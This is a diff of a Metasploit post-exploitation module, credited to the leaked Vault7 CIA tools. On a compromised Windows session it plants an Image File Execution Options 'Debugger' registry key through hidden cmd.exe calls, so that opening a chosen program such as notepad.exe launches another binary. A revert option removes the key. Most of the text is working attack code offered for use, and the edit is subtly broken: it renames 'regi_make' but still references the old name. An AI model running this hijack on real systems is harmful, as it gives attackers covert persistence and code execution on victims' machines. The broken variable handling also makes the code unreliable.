@@ -8,7 +8,7 @@
 
 ##
 # Vault7_cia_debugger_hijack.rb
-# $Id$ 1.1 Author: r00t-3xp10it | SSA RedTeam @2017
+# $Id$ 1.2 Author: r00t-3xp10it | SSA RedTeam @2017
 # Credits: https://wikileaks.org/ciav7p1/cms/page_2621770.html
 #
 #
@@ -22,8 +22,8 @@
 # [ POST MODULE OPTIONS ]
 # The session number to run this module on   => set SESSION 1
 # Application to be hijacked                 => set HIJACK notepad.exe
-# Binary to be executed (full path)          => set EXEC C:\\Windows\\System32\\calc.exe
-# Delete registry hijack keys                => set REVERT_HIJACK true
+# Full Path of the Binary to be executed     => set EXEC C:\\Windows\\System32\\calc.exe
+# Delete registry hijack hive/keys?          => set REVERT_HIJACK true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -91,7 +91,7 @@ class MetasploitModule < Msf::Post
                                         'Special thanks: Vault7 CIA Hacking Tools'    # CIA wikileaks public leak
                                 ],
  
-                        'Version'        => '$Revision: 1.1',
+                        'Version'        => '$Revision: 1.2',
                         'DisclosureDate' => 'abr 19 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -121,12 +121,12 @@ class MetasploitModule < Msf::Post
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                 OptString.new('HIJACK', [ false, 'Application to be hijacked (eg. notepad.exe)']),
-                                OptString.new('EXEC', [ false, 'Binary to be executed (eg. %windir%\\system32\\calc.exe)'])
+                                OptString.new('EXEC', [ false, 'Full Path of the Binary to be executed (eg. %windir%\\system32\\calc.exe)'])
                         ], self.class)
 
                 register_advanced_options(
                         [
-                                OptBool.new('REVERT_HIJACK', [ false, 'Delete registry hijack keys' , false])
+                                OptBool.new('REVERT_HIJACK', [ false, 'Delete registry hijacked hive/keys?' , false])
                         ], self.class)
  
         end
@@ -144,32 +144,44 @@ def hijack_funtion
   session = client
   executable = datastore['EXEC']
   exec_hijack = datastore['HIJACK']
-  regi_make = "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{exec_hijack}"
-  ireg_key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
-  if datastore['EXEC_PATH'] == 'nil'
+  reg_hive = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
+  reg_make = "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{exec_hijack}"
+  #
+  # Check if module options are rigth configurated ..
+  #
+  if datastore['HIJACK'] == 'nil' || datastore['EXEC'] == 'nil'
     print_error(" Options not configurated correctly ..")
-    print_warning(" Please set EXEC | HIJACK options!")
+    print_warning(" Please set HIJACK | EXEC options!")
     return nil
   else
     print_status("Hijacking #{exec_hijack} process!")
     Rex::sleep(1.5)
   end
 
+    #
     # Start writing registry keys ..
+    #
     print_warning(" Reading process registry hive keys ..")
     Rex::sleep(1.0)
-    if registry_enumkeys("#{ireg_key}")
-      print_good(" exec => remote registry hive key found ..")
+    # Check if registry hive exists ..
+    if registry_enumkeys("#{reg_hive}")
+      print_good(" exec => remote registry hive found ..")
       Rex::sleep(1.0)
-      print_good(" exec => Placing New Registry Key ..")
+      print_good(" exec => Placing new registry key (hijack) ..")
+      #
+      # PLacing new registry hive/keys, And start hijacked application ..
+      #
       r = session.sys.process.execute("cmd.exe /c \"#{regi_make}\" /v Debugger /t REG_SZ /d \"#{executable}\" /f", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(2.0)
       r = session.sys.process.execute("cmd.exe /c start \"#{executable}\"", nil, {'Hidden' => true, 'Channelized' => true})
       r.channel.close
       r.close
     else
-      # registry hive key not found, aborting module execution.
-      print_error("[ABORT]: module cant find the registry hive key needed...")
+      #
+      # registry hive not found, aborting module execution ..
+      #
+      print_error("[ABORT]: Module cant find the registry hive needed ..")
+      print_error("[HIVE] : #{regi_make}")
       print_line("")
       Rex::sleep(1.0)
       return nil
@@ -186,33 +198,40 @@ def revert_hijack
 
   r=''
   session = client
-  executable = datastore['EXEC']
   exec_hijack = datastore['HIJACK']
-  regi_make = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{exec_hijack}"
-  if datastore['EXEC_PATH'] == 'nil'
+  reg_delete = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{exec_hijack}"
+  #
+  # Check if module options are rigth configurated ..
+  #
+  if datastore['HIJACK'] == 'nil' || datastore['REVERT_HIJACK'] == 'nil'
     print_error(" Options not configurated correctly ..")
-    print_warning(" Please set EXEC | HIJACK options!")
+    print_warning(" Please set REVERT_HIJACK | HIJACK options!")
     return nil
   else
-    print_status("Revert #{exec_hijack} Hijack!")
+    print_status("Deleting #{exec_hijack} hijacked reg hive ..")
     Rex::sleep(1.5)
   end
 
-    # Start writing registry keys ..
+    #
+    # Start deleting registry hive/keys ..
+    #
     print_warning(" Reading process registry hive keys ..")
     Rex::sleep(1.0)
-    if registry_enumkeys("#{regi_make}")
-      print_good(" exec => remote registry hive key found ..")
+    if registry_enumkeys("#{reg_delete}")
+      print_good(" exec => Remote registry hive key found ..")
       Rex::sleep(1.0)
-      print_good(" exec => Deleting Registry Keys ..")
-      r = session.sys.process.execute("cmd.exe /c \"REG DELETE #{regi_make}\" /f", nil, {'Hidden' => true, 'Channelized' => true})
+      print_good(" exec => Deleting registry hive/keys ..")
+      r = session.sys.process.execute("cmd.exe /c \"REG DELETE #{reg_delete}\" /f", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(2.0)
       print_status("Registry Keys deleted successefully ..")
       r.channel.close
       r.close
     else
+      #
       # registry hive key not found, aborting module execution.
-      print_error("[ABORT]: module cant find the registry hive key needed...")
+      #
+      print_error("[ABORT]: module cant find the registry hive key needed ..")
+      print_error("[HIVE] : #{reg_delete}")
       print_line("")
       Rex::sleep(1.0)
       return nil
